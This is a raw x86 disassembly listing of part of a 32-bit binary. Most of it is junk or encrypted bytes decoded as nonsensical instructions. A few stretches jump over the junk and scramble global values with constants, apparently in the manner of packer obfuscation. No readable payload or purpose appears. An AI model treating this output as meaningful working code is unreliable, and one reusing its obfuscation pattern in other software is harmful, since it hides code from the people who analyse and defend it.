  40da62:	sub    al,bh
  40da64:	and    eax,0x2d4b7af9
  40da69:	or     al,0xe1
  40da6b:	or     BYTE PTR ds:0x4a600790,ch
  40da71:	jno    0x40da9a
  40da73:	mov    ecx,0x8f2f5011
  40da78:	ret    0x7c9b
  40da7b:	scas   al,BYTE PTR es:[edi]
  40da7c:	push   ss
  40da7d:	or     DWORD PTR [ebx],ebp
  40da7f:	mov    dh,0x27
  40da81:	mov    ebp,ds
  40da83:	lds    eax,FWORD PTR [eax+0x16]
  40da86:	jmp    0xd8a6:0xbc6ca811
  40da8d:	imul   ebp,esi,0x8dab9195
  40da93:	sbb    BYTE PTR [edx+ebx*4+0x8],ah
  40da97:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40da98:	int3   
  40da99:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40da9a:	pop    DWORD PTR ds:0x8d282516
  40daa0:	jae    0x40da9f
  40daa2:	jne    0x40da57
  40daa4:	hlt    
  40daa5:	fmul   DWORD PTR [esi]
  40daa7:	inc    esp
  40daa8:	xchg   BYTE PTR [edi+0x30],dh
  40daab:	cmp    eax,0x70f2a55f
  40dab0:	aaa    
  40dab1:	out    dx,al
  40dab2:	xchg   esp,eax
  40dab3:	mov    dh,0xff
  40dab5:	fs test eax,0x78c00b7a
  40dabb:	repz inc edi
  40dabd:	or     ax,0x79e1
  40dac1:	dec    ecx
  40dac2:	stos   BYTE PTR es:[edi],al
  40dac3:	aad    0x64
  40dac5:	inc    esp
  40dac6:	mov    bl,0x22
  40dac8:	rcr    DWORD PTR [edi],cl
  40daca:	and    eax,DWORD PTR [ecx]
  40dacc:	sbb    bh,dh
  40dace:	fs push esp
  40dad0:	dec    edi
  40dad1:	and    ebp,edi
  40dad3:	sub    al,0x15
  40dad5:	shl    BYTE PTR [ebx],1
  40dad7:	jbe    0x40daca
  40dad9:	cmp    eax,0xa7d70d6f
  40dade:	aas    
  40dadf:	cs mov edi,0x3475cde4
  40dae5:	xchg   ebp,eax
  40dae6:	mov    ds:0xf90f6d9,al
  40daeb:	jno    0x40db56
  40daed:	in     al,dx
  40daee:	mov    ds:0x40874f96,eax
  40daf3:	stos   DWORD PTR es:[edi],eax
  40daf4:	out    dx,eax
  40daf5:	add    eax,0x6b6d242d
  40dafa:	daa    
  40dafb:	ss clc 
  40dafd:	mov    DWORD PTR [ebp-0x4d],eax
  40db00:	cs push ebp
  40db02:	cmp    eax,0xb3592ec7
  40db07:	(bad)  
  40db08:	sbb    bh,bl
  40db0a:	add    al,0x87
  40db0c:	mov    esi,0x44d2ea93
  40db11:	fist   DWORD PTR [edx+esi*1]
  40db14:	push   ss
  40db15:	int    0x2
  40db17:	fucomi st,st(7)
  40db19:	dec    ecx
  40db1a:	xor    DWORD PTR [eax-0x4c],esi
  40db1d:	pop    ds
  40db1e:	sti    
  40db1f:	dec    eax
  40db20:	sti    
  40db21:	and    ch,BYTE PTR ds:0xe5e5bd97
  40db27:	les    ebx,FWORD PTR [ecx+0x19]
  40db2a:	or     eax,0x38f088fb
  40db2f:	out    0x21,eax
  40db31:	cld    
  40db32:	xchg   BYTE PTR [ebp-0x66b92a98],bh
  40db38:	sub    eax,0x34e1ab71
  40db3d:	mov    al,0x31
  40db3f:	add    dh,bh
  40db41:	jmp    DWORD PTR [esi+0xa]
  40db44:	outs   dx,BYTE PTR ds:[esi]
  40db45:	(bad)  
  40db46:	icebp  
  40db47:	repz aam 0x23
  40db4a:	fisttp WORD PTR [edx+0x36]
  40db4d:	test   DWORD PTR [ecx-0x20033f4a],eax
  40db53:	adc    al,0x7e
  40db56:	dec    ebp
  40db57:	ins    BYTE PTR es:[edi],dx
  40db58:	mov    edx,0x30043697
  40db5d:	dec    ebx
  40db5e:	or     edi,ebp
  40db60:	retf   0xf793
  40db63:	ja     0x40dba1
  40db65:	fnstenv [ebp+0x21]
  40db68:	jns    0x40db59
  40db6a:	fdivr  DWORD PTR [ecx+0x65f49cce]
  40db70:	sbb    DWORD PTR [ecx+0x6c9105bf],eax
  40db76:	mov    cl,0x69
  40db78:	add    edi,DWORD PTR [ebx-0x4fffcd49]
  40db7e:	call   0xcc92c19d
  40db83:	dec    eax
  40db84:	jo     0x40dbf6
  40db86:	sar    DWORD PTR es:[edi+0x5c],cl
  40db8a:	cmc    
  40db8b:	xchg   ebp,eax
  40db8c:	pushf  
  40db8d:	inc    edi
  40db8e:	and    DWORD PTR [edx],edi
  40db90:	jnp    0x40dbd2
  40db92:	scas   eax,DWORD PTR es:[edi]
  40db93:	xchg   ecx,eax
  40db94:	jb     0x40dbd7
  40db96:	out    0x8b,al
  40db98:	mov    esi,0xb72c508e
  40db9d:	inc    ebp
  40db9e:	pop    ss
  40db9f:	mov    ecx,0xc3d09a30
  40dba4:	or     dl,BYTE PTR [eax+0x5d9f84d0]
  40dbaa:	xchg   BYTE PTR [ebx],bh
  40dbac:	sbb    al,cl
  40dbae:	(bad)  
  40dbaf:	cmc    
  40dbb0:	int    0x89
  40dbb2:	pop    ss
  40dbb3:	jmp    DWORD PTR [edi]
  40dbb5:	cmp    eax,ecx
  40dbb7:	jne    0x40de3d
  40dbbd:	mov    eax,DWORD PTR [ebp-0x4]
  40dbc0:	xor    eax,edi
  40dbc2:	jmp    0x40de1f
  40dbc7:	mov    edi,0x5dc09dfd
  40dbcc:	loopne 0x40dc31
  40dbce:	adc    DWORD PTR [esi+0x5d40145c],0xfa5337fa
  40dbd8:	sahf   
  40dbd9:	jle    0x40dc59
  40dbdb:	ds jl  0x40dc5c
  40dbde:	jle    0x40dc4c
  40dbe0:	repnz retf 
  40dbe2:	push   ecx
  40dbe3:	and    al,0x43
  40dbe5:	nop
  40dbe6:	xchg   edi,eax
  40dbe7:	mov    edx,0xac4e6d4c
  40dbec:	jo     0x40dbc8
  40dbee:	retf   0x4285
  40dbf1:	xchg   ebp,eax
  40dbf2:	push   ss
  40dbf3:	mov    cl,0xf9
  40dbf5:	aad    0x4b
  40dbf7:	xchg   ebp,eax
  40dbf8:	test   BYTE PTR [ebx+0x3],dl
  40dbfb:	mov    al,ds:0xbfd476b
  40dc00:	pop    ss
  40dc01:	and    dh,cl
  40dc03:	in     eax,dx
  40dc04:	push   cs
  40dc05:	sub    eax,0x4c09f0ba
  40dc0a:	lds    ecx,FWORD PTR [ebx]
  40dc0c:	and    eax,esp
  40dc0e:	or     DWORD PTR [ecx],0xffffffda
  40dc11:	sar    dh,0xfe
  40dc14:	pop    eax
  40dc15:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40dc16:	dec    eax
  40dc17:	inc    edi
  40dc18:	sub    DWORD PTR [edx],0xae175179
  40dc1e:	jmp    0x40dc09
  40dc20:	adc    ebx,DWORD PTR [ecx-0x1a65d535]
  40dc26:	sbb    al,0x2c
  40dc28:	push   es
  40dc29:	out    0xc6,eax
  40dc2b:	(bad)  
  40dc2c:	sub    eax,0x6ad53dd
  40dc31:	jb     0x40dbd8
  40dc33:	jb     0x40dc24
  40dc35:	adc    eax,0xbf5e98e1
  40dc3a:	(bad)  
  40dc3d:	and    al,0x37
  40dc3f:	dec    eax
  40dc40:	xchg   ecx,eax
  40dc41:	or     al,0xdf
  40dc43:	loopne 0x40dc5e
  40dc45:	out    0x3c,al
  40dc47:	fisttp WORD PTR [eax-0x756923f8]
  40dc4d:	mov    cl,0xd3
  40dc4f:	cs retf 
  40dc51:	jmp    0xfbac368b
  40dc56:	repz aas 
  40dc58:	rcr    DWORD PTR [ecx+ebp*4],1
  40dc5b:	push   edx
  40dc5c:	inc    esi
  40dc5d:	in     eax,dx
  40dc5e:	in     eax,0xcf
  40dc60:	sub    cl,BYTE PTR [edx]
  40dc62:	jb     0x40dc73
  40dc64:	dec    ebx
  40dc65:	push   eax
  40dc66:	jle    0x40dc44
  40dc68:	cmp    eax,0x6efedc43
  40dc6d:	fstp   st(7)
  40dc6f:	xor    cl,cl
  40dc71:	dec    edi
  40dc72:	js     0x40dcc2
  40dc74:	inc    esp
  40dc75:	loope  0x40dc48
  40dc77:	pop    DWORD PTR [ebp-0xd2054f6]
  40dc7d:	dec    eax
  40dc7e:	xchg   ebx,eax
  40dc7f:	dec    BYTE PTR [esi]
  40dc81:	xor    cl,BYTE PTR [ebx+0x38ff2ae4]
  40dc87:	dec    eax
  40dc88:	(bad)  
  40dc89:	iret   
  40dc8a:	inc    edi
  40dc8b:	mov    esp,ebx
  40dc8d:	adc    cl,bl
  40dc8f:	out    dx,eax
  40dc90:	(bad)  
  40dc91:	aas    
  40dc92:	jg     0x40dc55
  40dc94:	popf   
  40dc95:	test   BYTE PTR [edx-0x6d],0x62
  40dc99:	dec    eax
  40dc9a:	xlat   BYTE PTR ds:[ebx]
  40dc9b:	je     0x40dc9f
  40dc9d:	mov    ?,WORD PTR [ecx+0x49bdcf03]
  40dca3:	imul   ebp,ecx,0x6232f094
  40dca9:	daa    
  40dcaa:	cmp    al,bh
  40dcac:	mov    BYTE PTR [edx],al
  40dcae:	icebp  
  40dcaf:	xchg   ah,bl
  40dcb1:	shl    eax,1
  40dcb3:	mov    ecx,0x69498f9d
  40dcb8:	ins    BYTE PTR es:[edi],dx
  40dcb9:	test   BYTE PTR ds:0x8c66b125,dl
  40dcbf:	shl    esp,cl
  40dcc1:	sbb    DWORD PTR [eax],esp
  40dcc3:	cwde   
  40dcc4:	inc    ecx
  40dcc5:	sbb    eax,esp
  40dcc7:	mov    edi,0xc4f995fa
  40dccc:	push   esi
  40dccd:	sub    BYTE PTR [eax+0x207e3a33],bh
  40dcd3:	or     al,0xee
  40dcd5:	rcr    bh,0xcd
  40dcd8:	add    ebp,esp
  40dcda:	mov    edi,0x7941438c
  40dcdf:	pop    ecx
  40dce0:	(bad)  
  40dce2:	stos   DWORD PTR es:[edi],eax
  40dce3:	add    eax,0x587b2425
  40dce8:	xor    BYTE PTR [edx+esi*4+0x73],al
  40dcec:	mov    eax,0x4c028da1
  40dcf1:	(bad)  
  40dcf3:	(bad)  
  40dcf4:	imul   BYTE PTR [ebx+0x3d]
  40dcf7:	push   edx
  40dcf8:	jmp    0x45797789
  40dcfd:	pop    esi
  40dcfe:	xchg   ebx,eax
  40dcff:	retf   
  40dd00:	scas   eax,DWORD PTR es:[edi]
  40dd01:	xor    al,BYTE PTR [esi+0x42]
  40dd04:	imul   esp,DWORD PTR ds:0xa6a509cb,0xe341018e
  40dd0e:	add    eax,0xa6a0f47e
  40dd13:	sbb    edi,edx
  40dd15:	cmp    BYTE PTR [eax+esi*2+0x78c6c91b],bl
  40dd1c:	fcomp  QWORD PTR [edx+0x151a91ad]
  40dd22:	cmp    DWORD PTR [eax-0x2589f5e4],0x61fd6a98
  40dd2c:	mov    dl,0x6e
  40dd2e:	(bad)  
  40dd2f:	push   ecx
  40dd30:	and    ch,BYTE PTR [ecx+edi*2-0x10]
  40dd34:	sahf   
  40dd35:	jmp    0xc6a5:0x4fc2bc33
  40dd3c:	dec    eax
  40dd3d:	dec    esp
  40dd3e:	sti    
  40dd3f:	shl    BYTE PTR [edx],0x82
  40dd42:	adc    BYTE PTR [edi+0x1d2400e3],ah
  40dd48:	out    0x5e,eax
  40dd4a:	loop   0x40dd7b
  40dd4c:	adc    eax,0x9c438b86
  40dd51:	dec    ecx
  40dd52:	jae    0x40dd32
  40dd54:	jge    0x40dda3
  40dd56:	out    0x75,al
  40dd58:	inc    esp
  40dd59:	or     BYTE PTR ds:0x8013e4,al
  40dd5f:	xchg   ecx,eax
  40dd60:	and    cl,bl
  40dd62:	sub    bl,BYTE PTR [ebp-0x36]
  40dd65:	xor    BYTE PTR ds:0x5c7b91e8,dl
  40dd6b:	dec    ebp
  40dd6c:	and    DWORD PTR ds:0x4f5ed959,0x634a1be6
  40dd76:	(bad)  [edi+0x21]
  40dd79:	sbb    edi,DWORD PTR [ecx+0x2884d0be]
  40dd7f:	fstp   TBYTE PTR [esi+esi*1]
  40dd82:	or     eax,DWORD PTR [edx-0x53e19c10]
  40dd88:	add    al,0xbd
  40dd8a:	jg     0x40dde9
  40dd8c:	mov    esp,0xcdfcf1b7
  40dd91:	jno    0x40dd6d
  40dd93:	xor    DWORD PTR [esp+ecx*1+0x7],ecx
  40dd97:	hlt    
  40dd98:	mov    ecx,0xd1133ba3
  40dd9d:	aaa    
  40dd9e:	out    dx,al
  40dd9f:	xchg   esp,eax
  40dda0:	ds cmp eax,0xe8e04a31
  40dda6:	mov    bl,0x61
  40dda8:	dec    esp
  40dda9:	mov    al,0xf7
  40ddab:	out    dx,eax
  40ddac:	add    bl,0xe4
  40ddaf:	xchg   ecx,eax
  40ddb0:	add    eax,eax
  40ddb2:	cli    
  40ddb3:	int3   
  40ddb4:	mul    DWORD PTR [ebx]
  40ddb6:	loop   0x40ddfe
  40ddb8:	idiv   DWORD PTR [ebx]
  40ddba:	and    ah,0x10
  40ddbd:	push   0x5196a3fa
  40ddc2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ddc3:	cld    
  40ddc4:	push   ds
  40ddc5:	lock sbb BYTE PTR [ecx+0x5a],ch
  40ddc9:	mov    ebx,DWORD PTR [ecx-0x1cb68886]
  40ddcf:	lods   al,BYTE PTR ds:[esi]
  40ddd0:	dec    ebp
  40ddd1:	pavgb  mm2,mm3
  40ddd4:	cmp    ebx,0x64
  40ddd7:	pop    edx
  40ddd9:	mov    edi,0x54dc089a
  40ddde:	xchg   BYTE PTR [edi+edx*8-0x4e],ah
  40dde2:	mov    ecx,edx
  40dde4:	call   0xcf839165
  40dde9:	adc    DWORD PTR [eax-0x6b],ebx
  40ddec:	ds push esp
  40ddee:	push   esi
  40ddef:	enter  0x5a98,0x3a
  40ddf3:	cmp    bl,BYTE PTR [ecx+eiz*1-0x49]
  40ddf7:	aad    0x3c
  40ddf9:	popa   
  40ddfa:	ret    
  40ddfb:	push   ecx
  40ddfc:	fcmovb st,st(4)
  40ddfe:	jmp    0xf4f2:0xa21e42e3
  40de05:	sahf   
  40de06:	push   0xffffffc9
  40de08:	loope  0x40dda9
  40de0a:	push   esp
  40de0b:	sti    
  40de0c:	int    0xbf
  40de0e:	add    BYTE PTR [edi+0x3e0a6d3e],ah
  40de14:	sahf   
  40de15:	call   0xaca4:0x976049c7
  40de1c:	push   ds
  40de1d:	push   ebx
  40de1e:	ins    DWORD PTR es:[edi],dx
  40de1f:	add    eax,esi
  40de21:	mov    ds:0x413bb8,eax
  40de26:	mov    eax,DWORD PTR [ebp-0x4]
  40de29:	xor    eax,edi
  40de2b:	add    eax,esi
  40de2d:	mov    ds:0x413bb0,eax
  40de32:	push   DWORD PTR [ebp-0x8]
  40de35:	push   DWORD PTR [ebp-0x4]
  40de38:	call   0x40de4a
  40de3d:	mov    eax,DWORD PTR [ebp-0x4]
  40de40:	xor    eax,edi
  40de42:	pop    edi
  40de43:	add    eax,esi
  40de45:	pop    esi
  40de46:	leave  
  40de47:	ret    0xc
  40de4a:	push   ebp
  40de4b:	mov    ebp,esp
  40de4d:	sub    esp,0x60
  40de50:	and    DWORD PTR ds:0x43369f,0x0
  40de5a:	mov    eax,ds:0x43369f
  40de5f:	inc    eax
  40de60:	mov    ds:0x43369f,eax
  40de65:	cmp    DWORD PTR ds:0x43369f,0x27
  40de6c:	jne    0x40de7e
  40de72:	push   DWORD PTR [ebp-0xc]
  40de75:	push   DWORD PTR [ebp-0x10]
  40de78:	call   DWORD PTR ds:0x4120e8
  40de7e:	cmp    DWORD PTR ds:0x43369f,0x19
  40de85:	jb     0x40de5a
  40de8b:	xor    DWORD PTR ds:0x4336ef,0x6001
  40de95:	jmp    0x40dfce
  40de9a:	push   ecx
  40de9c:	inc    ebp
  40de9d:	jb     0x40df10
  40de9f:	jb     0x40de4a
  40dea1:	icebp  
  40dea2:	fisubr WORD PTR [esi]
  40dea4:	into   
  40dea5:	idiv   DWORD PTR [edi+0x30]
  40dea8:	jge    0x40df0b
  40deaa:	mov    edx,0x127e7e9c
  40deaf:	jg     0x40df2f
  40deb1:	jle    0x40de42
  40deb3:	iret   
  40deb4:	enter  0x5bf3,0xb0
  40deb8:	add    DWORD PTR [ecx-0x7f],eax
  40debb:	bnd jmp 0x84db4c43
  40dec1:	push   esp
  40dec2:	sub    edx,DWORD PTR [ebx+0x42]
  40dec5:	mov    ebp,DWORD PTR [esi+0x64]
  40dec8:	scas   eax,DWORD PTR es:[edi]
  40dec9:	sbb    edi,DWORD PTR [ebx+ebp*8]
  40decc:	dec    esp
  40decd:	push   ebp
  40dece:	(bad)  
  40decf:	icebp  
  40ded0:	ds repnz in eax,0xde
  40ded4:	jnp    0x40de9b
  40ded6:	sahf   
  40ded7:	xor    DWORD PTR [edi],ebp
  40ded9:	arpl   bp,dx
  40dedb:	add    al,0xb1
  40dedd:	data16 and dl,BYTE PTR [ebp+ebx*2-0x53bb0241]
  40dee5:	aad    0xd1
  40dee7:	mov    cs,ebp
  40dee9:	cmp    eax,0x8aaa9e61
  40deee:	scas   al,BYTE PTR es:[edi]
  40deef:	mov    BYTE PTR [esi-0x1d],ch
  40def2:	mov    ebp,0x67d76c67
  40def7:	dec    ebp
  40def8:	fwait
  40def9:	repz adc eax,DWORD PTR [ecx-0x55]
  40defd:	push   eax
  40defe:	push   eax
  40deff:	adc    DWORD PTR [eax+0x15],eax
  40df02:	nop
  40df03:	adc    ecx,esp
  40df05:	cld    
  40df06:	push   cs
  40df07:	mov    WORD PTR [ebp+edi*1+0x3f5fd0b],es
  40df0e:	adc    bh,bl
  40df10:	das    
  40df11:	mov    eax,0xb099a49c
  40df16:	loop   0x40df5b
  40df18:	mov    ds:0x17ac662a,al
  40df1d:	arpl   WORD PTR [ebx+0xd],sp
  40df20:	ret    
  40df21:	mov    dh,ah
  40df23:	lods   al,BYTE PTR ds:[esi]
  40df24:	mov    bh,0xda
  40df26:	xor    edi,DWORD PTR [edi+0x799e78ad]
  40df2c:	repnz in eax,dx
  40df2e:	out    dx,eax
  40df2f:	push   ecx
  40df30:	daa    
  40df31:	dec    ebp
  40df32:	clc    
  40df33:	cmp    ch,BYTE PTR [ebx-0x614c1c41]
  40df39:	mov    ah,BYTE PTR [esi-0x64677bd4]
  40df3f:	push   esi
  40df40:	pop    ecx
  40df41:	pop    esp
  40df42:	cld    
  40df43:	jnp    0x40defe
  40df45:	and    cl,BYTE PTR [ebp+0x69486f26]
  40df4b:	xchg   edi,eax
  40df4c:	xlat   BYTE PTR ds:[ebx]
  40df4d:	mov    ch,0x19
  40df4f:	gs dec ebx
  40df51:	outs   dx,BYTE PTR ds:[esi]
  40df52:	ret    
  40df53:	pop    ebp
  40df54:	adc    al,0xbe
  40df56:	rcl    BYTE PTR [edx],1
  40df58:	inc    ecx
  40df59:	xor    edi,DWORD PTR [edi-0x23]
  40df5c:	mov    ch,0x4
  40df5e:	aaa    
  40df5f:	call   0x638db327
  40df64:	mov    dl,0x1a
  40df66:	iret   
  40df67:	or     edi,DWORD PTR [esi]
  40df69:	cmp    bh,BYTE PTR [ebx]
  40df6b:	adc    eax,0x2b6cf7e6
  40df70:	test   ebp,edx
  40df72:	lahf   
  40df73:	xor    DWORD PTR [ebx],esi
  40df75:	push   es
  40df76:	cmp    BYTE PTR [esi+0x5f20a187],ch
  40df7c:	mov    al,ds:0xe93874e6
  40df81:	pop    esp
  40df82:	outs   dx,DWORD PTR ds:[esi]
  40df83:	ret    0x4ffa
  40df86:	rcr    BYTE PTR [esi],1
  40df88:	mov    ecx,0x40671163
  40df8d:	dec    ebp
  40df8e:	or     dl,bh
  40df90:	(bad)  
  40df91:	shl    DWORD PTR [ecx-0x134a5030],1
  40df97:	enter  0xf47e,0xbd
  40df9b:	jns    0x40dfde
  40df9d:	dec    ecx
  40df9e:	shr    cl,0x7b
  40dfa1:	hlt    
  40dfa2:	pop    ebx
  40dfa3:	aad    0x4b
  40dfa5:	mov    BYTE PTR [edx+0x35],bh
  40dfa8:	inc    esp
  40dfa9:	iret   
  40dfaa:	test   DWORD PTR [esi+0x42],esi
  40dfad:	and    al,0x7
  40dfaf:	imul   ebx,DWORD PTR [edi+0x22],0x5ec4dc18
  40dfb6:	add    bl,BYTE PTR ds:0x704a38fa
  40dfbc:	adc    al,0x3
  40dfbe:	mov    eax,eax
  40dfc0:	adc    BYTE PTR [eax+eiz*4-0x5912366],al
  40dfc7:	loope  0x40df88
  40dfc9:	mov    ds:0xa6c8f07,al
  40dfce:	mov    eax,DWORD PTR [ebp+0x8]
  40dfd1:	sub    DWORD PTR ds:0x433697,0x625
  40dfdb:	push   ebx
  40dfdc:	sub    DWORD PTR ds:0x4336eb,0x540f
  40dfe6:	push   esi
  40dfe7:	or     ebx,0x36b6
  40dfed:	mov    esi,0x7510854
  40dff2:	jmp    0x40e12b
  40dff7:	cmp    BYTE PTR [ebx-0x678ee5cf],dh
  40dffd:	shl    DWORD PTR [ecx+0x78],1
  40e000:	xor    esi,ecx
  40e002:	stos   BYTE PTR es:[edi],al
  40e003:	xchg   ebx,eax
  40e004:	xor    DWORD PTR [edi+0x40],0x7e7e9d5e
  40e00b:	adc    bh,BYTE PTR [edi+0x7e]
  40e00e:	jle    0x40e011
  40e010:	clc    
  40e011:	dec    esp
  40e012:	repz mov WORD PTR ds:0x43b08182,?
  40e019:	test   BYTE PTR [edx-0x34],dh
  40e01c:	lea    edx,[eax-0x73eb400e]
  40e022:	fist   WORD PTR [ecx+edx*8+0x69]
  40e026:	and    al,0xfe
  40e028:	rcr    BYTE PTR [ebx],0x19
  40e02b:	inc    ecx
  40e02c:	imul   ebp,DWORD PTR [ebp+0x2b],0xea88bc9a
  40e033:	cli    
  40e034:	xchg   edi,eax
  40e035:	mov    al,0xec
  40e037:	les    esi,FWORD PTR [eax+0x9]
  40e03a:	and    DWORD PTR [eax+ecx*8+0x11],0x9e622b50
  40e042:	xchg   esp,eax
  40e043:	jle    0x40e0ad
  40e045:	(bad)  
  40e046:	fcom   st(2)
  40e048:	adc    al,0x5b
  40e04a:	inc    edx
  40e04b:	pop    ebp
  40e04c:	das    
  40e04d:	xchg   DWORD PTR ds:0x5090c760,eax
  40e053:	rol    ebx,cl
  40e055:	mov    DWORD PTR [ebx+edi*8],edx
  40e058:	cmp    eax,0x61c46ff4
  40e05d:	inc    eax
  40e05e:	cmp    eax,0x329d316e
  40e063:	jecxz  0x40e038
  40e065:	xor    al,0x6d
  40e067:	push   0xffffffe2
  40e069:	or     al,0x3f
  40e06b:	pop    ebx
  40e06c:	aam    0xf
  40e06e:	add    edx,ebp
  40e070:	add    eax,0xd4a851e4
  40e075:	(bad)  
  40e076:	scas   eax,DWORD PTR es:[edi]
  40e077:	push   es
  40e078:	xchg   edx,eax
  40e079:	mov    ebx,0x68ee6ad2
  40e07e:	bound  esp,QWORD PTR [esi+0x4c]
  40e081:	pop    edi
  40e082:	neg    eax
  40e084:	xlat   BYTE PTR ds:[ebx]
  40e085:	out    dx,eax
  40e086:	fld    TBYTE PTR [esi-0x6c]
  40e089:	pushf  
  40e08a:	pop    ebp
  40e08b:	cwde   
  40e08c:	mov    bl,0x2f
  40e08e:	mov    dh,0xbe
  40e090:	mov    esp,0x9859eb88
  40e095:	sbb    BYTE PTR [esi],0x30
  40e098:	xor    esi,DWORD PTR [ecx]
  40e09a:	icebp  
  40e09b:	loope  0x40e08f
  40e09d:	mov    dh,0x9a
  40e09f:	sub    BYTE PTR [edi+edi*8-0x68d26298],al
  40e0a6:	sub    esi,ebp
  40e0a8:	dec    ecx
  40e0a9:	push   ebx
  40e0aa:	call   0xaf66b183
  40e0af:	aad    0x23
  40e0b1:	and    cl,BYTE PTR [ebx+0x17d52cd9]
  40e0b7:	out    dx,eax
  40e0b8:	cli    
  40e0b9:	es push ecx
  40e0bb:	xchg   edi,eax
  40e0bc:	ror    BYTE PTR [esi+0x60],cl
  40e0bf:	call   0x7b9b8055
  40e0c4:	outs   dx,DWORD PTR ds:[esi]
  40e0c5:	sub    al,0xe2
  40e0c7:	or     bh,BYTE PTR [eax+0x5d536929]
  40e0cd:	xchg   esi,eax
  40e0ce:	loopne 0x40e05e
  40e0d0:	mov    eax,0x493106b
  40e0d5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e0d6:	ins    DWORD PTR es:[edi],dx
  40e0d7:	lods   eax,DWORD PTR ds:[esi]
  40e0d8:	sbb    ebp,DWORD PTR [ebx+0x50]
  40e0db:	dec    esi
  40e0dc:	mov    al,0x57
  40e0de:	mov    ch,0x49
  40e0e0:	retf   0xb6f8
  40e0e3:	cmp    DWORD PTR [edx-0x27],ebp
  40e0e6:	nop
  40e0e7:	jns    0x40e0ff
  40e0e9:	add    eax,0x20f25abf
  40e0ee:	or     BYTE PTR [eax+eiz*2],al
  40e0f1:	ins    DWORD PTR es:[edi],dx
  40e0f2:	xor    esp,DWORD PTR [ebx-0x3fe371ee]
  40e0f8:	mov    ebp,0x1e812d42
  40e0fd:	(bad)
  40e102:	push   0x9583658a
  40e107:	xor    esp,DWORD PTR [edi+ecx*1]
  40e10a:	call   0x5f26800e
  40e10f:	retf   
  40e110:	fdivr  QWORD PTR [edi-0x28]
  40e113:	lock in eax,0x22
  40e116:	outs   dx,BYTE PTR ds:[esi]
  40e117:	cmp    al,0xe5
  40e119:	lahf   
  40e11a:	inc    esp
  40e11b:	cld    
  40e11c:	test   eax,0xb2d24259
  40e121:	dec    esp
  40e122:	popf   
  40e123:	mov    esp,0x9dadd161
  40e128:	outs   dx,DWORD PTR ds:[esi]
  40e129:	pop    ebp
  40e12a:	push   ds
  40e12b:	xor    eax,esi
  40e12d:	adc    DWORD PTR ds:0x4336a3,0x2097
  40e137:	mov    ebx,0x32729b
  40e13c:	xor    DWORD PTR ds:0x4336ef,0x2259
  40e146:	add    eax,ebx
  40e148:	push   edi
  40e149:	jmp    0x40e282
  40e14e:	pop    ebx
  40e14f:	jecxz  0x40e12d
  40e151:	call   0x71acd2ba
  40e156:	and    ecx,DWORD PTR [eax]
  40e158:	out    0xd3,al
  40e15a:	push   eax
  40e15b:	or     ebp,ecx
  40e15d:	pop    edi
  40e15e:	jb     0x40e0fa
  40e160:	jle    0x40e1e0
  40e162:	adc    bh,BYTE PTR [edi+0x7e]
  40e165:	jle    0x40e1d9
  40e167:	mov    eax,0x87a4bea5
  40e16c:	cld    
  40e16d:	mov    ebx,0x7c43cff2
  40e172:	or     BYTE PTR [esp+eax*4-0x19],cl
  40e176:	loop   0x40e1b6
  40e178:	es pop es
  40e17a:	add    esp,DWORD PTR [ecx+0x2a043fde]
  40e180:	daa    
  40e181:	mov    ah,0x79
  40e183:	(bad)  
  40e184:	ret    0xfeca
  40e187:	cmp    eax,0x859b2864
  40e18c:	push   edi
  40e18d:	(bad)  
  40e18e:	push   0x7403954c
  40e193:	fsubr  DWORD PTR [ebx]
  40e195:	cli    
  40e196:	xchg   DWORD PTR ds:0xe7b5ac52,eax
  40e19c:	lea    edx,[eax]
  40e19e:	dec    ebp
  40e19f:	dec    esi
  40e1a0:	adc    cl,BYTE PTR [edi-0x67]
  40e1a3:	pop    ss
  40e1a4:	inc    esi
  40e1a5:	push   esp
  40e1a6:	dec    eax
  40e1a7:	lock jns 0x40e12d
  40e1aa:	add    eax,0xbb0e8ea2
  40e1af:	loopne 0x40e1b0
  40e1b1:	inc    ecx
  40e1b2:	xchg   ecx,eax
  40e1b3:	pop    esp
  40e1b4:	shl    dl,0xb3
  40e1b7:	jbe    0x40e1ab
  40e1b9:	cli    
  40e1ba:	pushf  
  40e1bb:	xchg   esp,eax
  40e1bc:	(bad)  
  40e1be:	jno    0x40e206
  40e1c0:	adc    eax,0xe1ca4407
  40e1c5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e1c6:	(bad)  
  40e1c7:	push   esi
  40e1c8:	mov    ds:0xe908976d,eax
  40e1cd:	gs sti 
  40e1cf:	inc    ebx
  40e1d0:	stos   DWORD PTR es:[edi],eax
  40e1d1:	lock dec eax
  40e1d3:	mov    edx,0xff18b6dd
  40e1d8:	push   eax
  40e1d9:	sbb    DWORD PTR [ebp*8-0x2b219e1d],0x71d89300
  40e1e4:	imul   ebp,DWORD PTR [edx-0x2f],0x4f
  40e1e8:	enter  0x4596,0xf2
  40e1ec:	or     BYTE PTR [ecx+edi*1-0x27],ch
  40e1f0:	or     al,ah
  40e1f2:	pusha  
  40e1f3:	loop   0x40e23e
  40e1f5:	iret   
  40e1f6:	fs mov esp,0x662d5e23
  40e1fc:	xor    ebp,edi
  40e1fe:	gs mov dl,0x11
  40e201:	sub    ebx,DWORD PTR [ebx+0x430e84ac]
  40e207:	push   0xfffffffb
  40e209:	(bad)
  40e20d:	aas    
  40e20e:	mov    edx,DWORD PTR [edi-0x77d7cb2f]
  40e214:	outs   dx,BYTE PTR ds:[esi]
  40e215:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e216:	(bad)  
  40e217:	in     al,0xf6
  40e219:	mov    ebx,0x93f13707
  40e21e:	pop    esp
  40e21f:	mov    edx,esi
  40e221:	icebp  
  40e222:	les    eax,FWORD PTR [eax-0x4762578d]
  40e228:	mov    esp,0x2b5a0453
  40e22d:	test   BYTE PTR [eax+0x6942d600],ch
  40e233:	jecxz  0x40e1f7
  40e235:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e236:	mov    ds:0xea6b26c0,al
  40e23b:	push   cs
  40e23c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e23d:	pop    esi
  40e23e:	ror    BYTE PTR [ebx+eax*4+0x9],cl
  40e242:	sub    BYTE PTR [edi],ch
  40e244:	inc    ebp
  40e245:	ret    0x6d75
  40e248:	shl    DWORD PTR [ecx+0x32],0x2e
  40e24c:	mov    esp,0x12df2da9
